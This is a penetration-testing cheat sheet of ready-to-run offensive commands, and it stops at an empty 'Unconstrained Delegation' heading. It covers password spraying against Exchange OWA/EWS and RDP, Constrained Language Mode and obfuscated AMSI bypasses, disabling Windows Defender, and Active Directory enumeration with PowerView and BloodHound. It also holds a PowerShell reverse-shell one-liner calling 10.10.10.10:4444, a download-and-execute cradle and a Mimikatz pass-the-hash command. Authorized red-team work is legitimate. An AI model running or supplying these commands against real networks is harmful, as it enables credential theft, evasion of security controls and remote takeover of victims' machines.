# **Enterprise Penetration Testing Cheat Sheet**

## Attacking OWA and EWS
- Do OSINT against the target company. LinkedIn and Google is a good place to start.
- Harvest email addresses and create different naming conventions.
- Tools: MailSniper.ps1 (https://github.com/dafthack/MailSniper), Metasploit 

Internal or External domain enumeration:
```
PS C:\Tools> Import-Module .\MailSniper.ps1
PS C:\Tools> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -OutFile possibledomains.txt -CompanyName "Company A"
```
Username enumeration:
```
PS C:\Tools> Import-Module .\MailSniper.ps1
PS C:\Tools> Invoke-UsernameHarvestOWA -UserList .\userlist.txt -ExchHostname mail.domain.com -Domain domain.txt -OutFile possibleusernames.txt
```
With metasploit (timing attack):
```
msf5 > use auxiliary/scanner/http/owa_login >
```
Password spraying (doable with metasploit's owa_login as well):
```
PS C:\Tools> Import-Module .\MailSniper.ps1
PS C:\Tools> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\usernames.txt -Password Pa$$w0rd -Threads 15 -OutFile .\results.txt
```
EWS:
```
PS C:\Tools> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\usernames.txt -Password Pa$$w0rd -Threads 15 -OutFile .\results.txt
```
## Extracting GAL
- Assuming we got valid credentials
```
PS C:\Tools> Import-Module .\MailSniper.ps1
PS C:\Tools> Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Pa$$w0rd -OutFile .\GAL.txt
```
## Attacking External Facing RDP
- Tools: RDPassSpray.py (https://github.com/xFreed0m/RDPassSpray)
```
# python3 RDPassSpray.py -u chunk -p nocaptainchunk! -d EASY-CORE -t 10.10.10.10:<port>
# python3 RDPassSpray.py -U users.txt -P passwords.txt -d EASY-CORE -t 10.10.10.10:<port>
```
## Bypassing Constrained Language Mode (CLM)
- Tools: PowerShdll (https://github.com/p3nt4/PowerShdll)

Checking current language mode:
```
PS C:\Tools> $ExecutionContext.SessionState.LanguageMode
```
Only works when CLM is locally setup.
```
PS C:\Tools> curl http://10.10.10.10/PowerShdll.dll -OutFile ps.dll
PS C:\Tools> rundll32.exe .\ps.dll, main -i
```
With Local Admin (GUI):
- Edit the system environment variables
- __PSLockDownPolicy set to 8

With Local Admin (CLI):
```
PS C:\Tools> Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
PS C:\Tools> setx _PSLockdownPolicy 0 /m
```

## AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
With ps.dll:
```
PS C:\Tools> curl http://10.10.10.10/amsibypass.ps1 -OutFile amsibypass.ps1
PS C:\Tools> $amsi = [IO.File]::ReadAllText(".\amsibypass.ps1")

PS C:\Tools> IEX $amsi
```
## Dealing with Windows Defender (requires elevated rights)
```
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Active Directory Enumeration
- Tools: PowerView.ps1, PowerView_dev.ps1 (PowerView 3), BloodHound, PingCastle

Enumerating Domain:
```
PS C:\Tools> Get-NetDomain -Domain domain.local
PS C:\Tools> Get-DomainSID
PS C:\Tools> (Get-DomainPolicy)."system access"
PS C:\Tools> Get-NetDomainController -Domain domain.local
```
Enumerating Trusts and Forest:
```
PS C:\Tools> Get-NetDomainTrust -Domain
PS C:\Tools> Get-NetForestCatalog
PS C:\Tools> Get-NetForest
PS C:\Tools> Get-NetForestDomain | Get-NetDomainTrust
```
Enumerating Users:
```
PS C:\Tools> Get-NetUser | select -ExpandProperty samaccountname | clip
PS C:\Tools> Get-UserProperty
PS C:\Tools> Find-UserField

Powerview_dev

PS C:\Tools> $Date = (Get-Date).AddYears(-1).ToFileTime()
PS C:\Tools> Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset | clip
```
Enumerating Group Membership of Users:
```
PS C:\Tools> Get-NetGroup -UserName admin | select cn | clip
```
Enumerating Groups:
- Use both PowerView and dev
```
PS C:\Tools> Get-NetGroup -Domain domain.local
PS C:\Tools> Get-NetGroup -GroupName "Domain Admins"
PS C:\Tools> Get-NetLocalGroup -ComputerName dt-dc -Recurse
PS C:\Tools> Get-NetLocalGroupMember -ComputerName DT-DC1.domain.local -GroupName "administrators"
```
Enumerating Group Members:
```
PS C:\Tools> Get-NetGroup -UserName admin
PS C:\Tools> Get-NetGroupMember -GroupName "Domain Admins"

PowerView dev:

PS C:\Tools> Get-NetGroupMember -Identity "Domain Admins" | select MemberName,MemberSID | clip
```
Enumerating Computers:
```
PS C:\Tools> Get-NetComputer
PS C:\Tools> Get-NetComputer -Ping
PS C:\Tools> Get-NetComputer -FullData
```
Enumerating Shares:
```
PS C:\Tools> Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC

PowerView dev:

PS C:\Tools> Find-InterestingDomainShareFile
```
Enumerating OU:
```
PS C:\Tools> Get-NetOU
PS C:\Tools> Get-NetOU myOUname | %{Get-NetComputer -ADSPath $_}

PowerView dev:

PS C:\Tools> Get-NetOU | select distinguishedname (do this first)
PS C:\Tools> Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=us,DC=funcorp,DC=local" | select name
```
Enumerating GPO:
```
PS C:\Tools> Get-NetGPO
PS C:\Tools> Get-NetGPO -CompouterName dt-dc
PS C:\Tools> Get-NetGPO | select flags,cn
PS C:\Tools> Get-NetGPO -GPOname "{xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}"
PS C:\Tools> (Get-NetOU testOU -FullData).gplink (Enumerate GPO applied on the testOU OU)

PowerView dev:

PS C:\Tools> Get-DomainGPO -ComputerIdentity DT-DC | select displayname,cn
```
Enumerating ACL:
```
PS C:\Tools> Invoke-ACLScanner | select ObjectDN,ActiveDirectoryRights,IdentityReference
PS C:\Tools> Invoke-ACLScanner -ResolveGUIDs
PS C:\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "admin"}
```
Enumerating objects with Unconstrained Delegation:
```
PS C:\Tools> Get-DomainComputer -Unconstrained | select cn
```
Enumerating objects with Constrained Delegation:
```
PS C:\Tools> Get-DomainUser -TrustedToAuth | select cn,useraccountcontrol,serviceprincipalname
S C:\Tools> Get-DomainComputer -TrustedToAuth
```
## BloodHound
Use the latest BloodHound 3 and Neo4j 4.1
```
PS C:\Tools> . .\SharpHound.ps1
PS C:\Tools> Invoke-BloodHound -CollectionMethod All
```
## Privilege Escalation
Hunting for Local Admin access:
Tools: PowerView.ps1, Find-WMILocalAdminAccess.ps1, Find-PSRemotingLocalAdminAccess.ps1
```
PS C:\Tools> Find-LocalAdminAccess

PS C:\Tools> . .\Find-WMILocalAdminAccess.ps1
PS C:\Tools> Find-WMILocalAdminAccess

PS C:\Tools> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Tools> Find-PSRemotingLocalAdminAccess
```
PowerUp:
```
PS C:\Tools> . .\PowerUp.ps1
PS C:\Tools> Invoke-AllChecks
```

## One Liner PowerShell Reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Reverse Shell from a PSSession
```
[dt-dc]: PS C:\Users\admin\Documents> $Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.50.147/nishang8080.ps1''))'
[dt-dc]: PS C:\Users\admin\Documents> Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\Users\admin\Desktop\reverse.bat
[dt-dc]: PS C:\Users\admin\Documents> Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:domain.local /ntlm:92937945B518814341DE3F726500D4FF /run:C:\users\appadmin\desktop\reverse.bat"'
```
## Kerberos Attacks
A word about kerberos (credits to a youtube user "twaca")
> One way to  think of  using Kerberos  is  to  think of  going to  an  amusement park. When  you arrive at  the park, you go  to  the main gate. You then  proceed to  the main ticket  booth (the authentication  server  in the key distribution  center) and purchase  an  all-day pass  to  the park  (a  ticket-granting ticket).  You receive a purple  wristband (because  purple  is  the color for Wednesday)  that  indicates that  you have paid  your fee for that  day and you have full access  to  the park. The colored wristband is  good  for all day. While in the park, you must  purchase  additional  tickets for the rides.  You walk  up  to  a ticket  booth (ticket-granting  server) and the attendant notices that  you have a purple wristband.  You tell her you are wanting to  ride  the roller  coaster.  She issues  you a ticket (session  ticket) for the roller  coaster.  When  you get to  the roller  coaster,  the roller  coaster attendant sees  your purple  wristband and accepts the ticket  issued  to  you by  the ticket seller. The roller  coaster attendant does  not need  to  check with  the ticket  seller  because that  is  the only  place you could have obtained  that  ticket. At  the end of  the day,  when  the park  closes, the purple  wristband for Wednesday no  longer authenticates you.  The wristband color for Thursday  is  orange. You also  noticed that you did all the work. None  of  the ticket  sellers or  ride  operators communicated  with  each other.  It  was up  to  you to  procure tickets and walk  around  and distribute  them. This  is exactly the model as  designed  by  MIT for Kerberos.

## Unconstrained Delegation
